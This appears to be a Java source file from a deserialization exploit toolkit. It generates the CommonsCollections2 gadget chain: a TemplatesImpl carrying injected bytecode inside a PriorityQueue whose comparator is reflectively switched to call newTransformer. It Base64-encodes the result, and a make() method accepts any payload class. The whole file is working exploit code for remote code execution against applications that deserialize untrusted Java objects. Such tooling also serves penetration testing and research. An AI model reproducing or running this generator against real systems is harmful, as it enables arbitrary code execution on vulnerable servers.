package org.tools.ser;

import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.tools.ClassFiles;
import org.tools.Reflections;
import org.tools.encryption.B64;

import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.util.Base64;
import java.util.PriorityQueue;

/**
 * @author Whoopsunix
 */
public class CC2Generator {
    public static void main(String[] args) throws Exception{
        B64 b64 = new B64();
        String base64Str = b64.encodeObj(cc2Demo(b64.encodeJavaClass(Calc.class)));

//        byte[] bytes = Base64.getDecoder().decode(base64Str);
//        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
//        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
//        objectInputStream.readObject();
    }

    public String make(Class<?> clazz) throws Exception {
        B64 b64 = new B64();
        return b64.encodeObj(cc2Demo(b64.encodeJavaClass(clazz)));
    }

    public static class Foo implements Serializable {
        private static final long serialVersionUID = 8207363842866235160L;
    }
    public static Object cc2Demo(String base64Payload) throws Exception {
        byte[] bytes = java.util.Base64.getDecoder().decode(base64Payload);
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl();
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{bytes, ClassFiles.classAsBytes(Foo.class)});
        Reflections.setFieldValue(templates, "_name", "anystr");
        Reflections.setFieldValue(templates, "_transletIndex", 0);
        Reflections.setFieldValue(templates, "_tfactory", new com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl());
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(transformer));
        // stub data for replacement later
        queue.add(1);
        queue.add(1);

        // switch method called by comparator
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = 1;

        return queue;
    }
}
